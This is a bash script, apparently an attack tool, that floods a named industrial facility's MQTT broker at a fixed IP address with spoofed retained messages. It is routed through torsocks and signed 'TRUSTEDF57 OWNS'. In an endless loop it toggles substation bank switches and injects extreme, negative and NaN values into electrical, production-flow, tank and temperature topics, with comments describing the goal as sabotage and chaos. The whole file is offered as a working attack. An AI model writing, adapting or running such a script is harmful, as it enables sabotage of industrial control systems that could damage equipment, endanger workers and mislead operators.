#!/bin/bash
# SABOTAGGIO MILITARE INOLASA - TRUSTEDF57 OWNS
# Danni totali + DISCO LIGHTS | torsocks rotation | Payload nativi
TARGET="172.172.97.119"
INTERVALO=1  # sec tra burst per caos continuo

echo "[TRUSTEDF57] Sabotaggio MILITARE + DISCO MODE attivato..."

# DISCO LIGHTS (SW1/SW2/SW3 lampeggi rapidi su Bancos con Steps/SW)
disco_lights() {
    local disco_topics=(
        "Inolasa/Energia/Sub3/Banco 1"
        "Inolasa/Energia/Sub3/Banco 2"
        "Inolasa/Energia/Sub3/Banco 4"
        "Inolasa/Energia/Sub3/Banco Cap 5"
    )
    
    for topic in "${disco_topics[@]}"; do
        # Frame 1: TUTTO ACCESO
        torsocks mosquitto_pub -h $TARGET -p 1883 -t "$topic" \
            -m '{"Steps":"11111111111111","SW1":9999,"SW2":9999,"SW3":9999,"TRUSTEDF57":"OWNS"}' -q 1 -r &
        
        sleep 0.2
        # Frame 2: TUTTO SPENTO
        torsocks mosquitto_pub -h $TARGET -p 1883 -t "$topic" \
            -m '{"Steps":"00000000000000","SW1":0,"SW2":0,"SW3":0,"TRUSTEDF57":"OWNS"}' -q 1 -r &
        
        sleep 0.2
        # Frame 3: MEZZO ON/OFF (pattern disco)
        torsocks mosquitto_pub -h $TARGET -p 1883 -t "$topic" \
            -m '{"Steps":"10101010101010","SW1":5000,"SW2":0,"SW3":9999,"TRUSTEDF57":"OWNS"}' -q 1 -r &
    done
    wait
}

# DANNI ELETTRICI ESTREMI (oscillazioni folli V/I/P)
danni_elettrici() {
    local bancs=(
        "Inolasa/Energia/Sub3/Banco 1" "Inolasa/Energia/Sub3/Banco 2" 
        "Inolasa/Energia/Sub3/Banco 4" "Inolasa/Energia/Sub1/Banco 2"
        "Inolasa/Energia/Sub3/Banco Cap 1" "Inolasa/Energia/Sub3/Banco Cap 2"
        "Inolasa/Energia/Sub3/Banco Cap 3" "Inolasa/Energia/Sub3/Banco Cap 4"
        "Inolasa/Energia/Sub3/Banco Cap 5" "Inolasa/Energia/Sub2/Caldera Petra"
    )
    
    for banc in "${bancs[@]}"; do
        # Oscillazione: MAX → MIN → NaN → MAX*10
        torsocks mosquitto_pub -h $TARGET -p 1883 -t "$banc" \
            -m '{"V":99999,"I":99999,"P":999999,"E":999999999999,"FP":0,"F":999,"THDIA":100,"Alarm":4095,"TRUSTEDF57":"OWNS"}' -q 1 -r &
        sleep 0.1
        
        torsocks mosquitto_pub -h $TARGET -p 1883 -t "$banc" \
            -m '{"V":0,"I":0,"P":0,"E":0,"FP":0,"F":0,"THDIA":0,"Alarm":0,"TRUSTEDF57":"OWNS"}' -q 1 -r &
        sleep 0.1
        
        torsocks mosquitto_pub -h $TARGET -p 1883 -t "$banc" \
            -m '{"V":NaN,"I":NaN,"P":NaN,"E":NaN,"TRUSTEDF57":"OWNS"}' -q 1 -r &
        sleep 0.1
        
        torsocks mosquitto_pub -h $TARGET -p 1883 -t "$banc" \
            -m '{"V":999999,"I":999999,"P":9999999,"E":999999999999999,"TRUSTEDF57":"OWNS"}' -q 1 -r &
    done
    wait
}

# PRODUZIONE CAOS (flussi inversi, totali negativi, stati random)
caos_produzione() {
    local prods=(
        "Inolasa/Produccion/Neutra/Flujo" "Inolasa/Produccion/Neutra/Total"
        "Inolasa/Produccion/Desgomado/Flujo" "Inolasa/Produccion/Desgomado/Total"
        "Inolasa/Produccion/Lecitina/Flujo" "Inolasa/Produccion/Lecitina/Total"
        "Inolasa/Produccion/Descerado/Flujo" "Inolasa/Produccion/Descerado/Total"
        "Inolasa/Produccion/Crudos/Flujo" "Inolasa/Produccion/Crudos/Total"
        "Inolasa/Produccion/AD1" "Inolasa/Produccion/AD4" "Inolasa/Produccion/AD5"
    )
    
    for prod in "${prods[@]}"; do
        torsocks mosquitto_pub -h $TARGET -p 1883 -t "$prod" \
            -m '{"flujo":-99999,"total":-999999,"acumulado":-999999999,"TRUSTEDF57":"OWNS"}' -q 1 -r &
        sleep 0.1
    done
    
    # Stati random + paros estremi
    torsocks mosquitto_pub -h $TARGET -p 1883 -t "Inolasa/Produccion/Neutra/Estado" \
        -m '{"on":true,"paros":999999,"estado":"TRUSTEDF57_CHAOS","TRUSTEDF57":"OWNS"}' -q 1 -r &
    torsocks mosquitto_pub -h $TARGET -p 1883 -t "Inolasa/Produccion/Lecitina/Estado" \
        -m '{"on":false,"paros":0,"lecitina":99999,"TRUSTEDF57":"OWNS"}' -q 1 -r &
    wait
}

# TANQUES OVERFLOW + vuoti alternati
caos_tanques() {
    local tanks=(
        "Inolasa/Tanques/Tanque 1" "Inolasa/Tanques/Tanque 2"
        "Inolasa/Tanques/Bunker/Tanque 1" "Inolasa/Tanques/Bunker/Tanque 2"
    )
    
    for tank in "${tanks[@]}"; do
        # Overflow → Vuoto → Negativo
        torsocks mosquitto_pub -h $TARGET -p 1883 -t "$tank" \
            -m '{"V":999999,"L":999999,"peso":999999,"TRUSTEDF57":"OWNS"}' -q 1 -r &
        sleep 0.1
        torsocks mosquitto_pub -h $TARGET -p 1883 -t "$tank" \
            -m '{"V":0,"L":0,"peso":-99999,"TRUSTEDF57":"OWNS"}' -q 1 -r &
    done
    wait
}

# TERMICO ESTREMO (999°C → -50°C → NaN)
termico_caos() {
    torsocks mosquitto_pub -h $TARGET -p 1883 -t "Inolasa/Produccion/Lecitina/Temp" \
        -m '{"TFP1":999,"TFP2":-50,"TRUSTEDF57":"OWNS"}' -q 1 -r &
    torsocks mosquitto_pub -h $TARGET -p 1883 -t "Inolasa/Produccion/Lecitina/Vacio" \
        -m '{"TFP1":99999,"TFP2":-99999,"TRUSTEDF57":"OWNS"}' -q 1 -r &
    wait
}

# LOOP INFINITO CAOS (Ctrl+C per stop)
while true; do
    echo "[TRUSTEDF57] DISCO + CAOS LOOP..."
    
    disco_lights      # Luci lampeggi su SW/Steps (Bancos 1/2/4/Cap5)
    sleep $INTERVALO
    
    danni_elettrici   # V/I/P NaN + MAX/MIN (tutti Bancos)
    sleep $INTERVALO
    
    caos_produzione   # Flussi NEGATIVI + stati caos
    sleep $INTERVALO
    
    caos_tanques      # Tanques overflow/vuoti
    sleep $INTERVALO
    
    termico_caos      # Termico distruttivo
    
    echo "[TRUSTEDF57 OWNS] Ciclo completato - continua caos..."
done
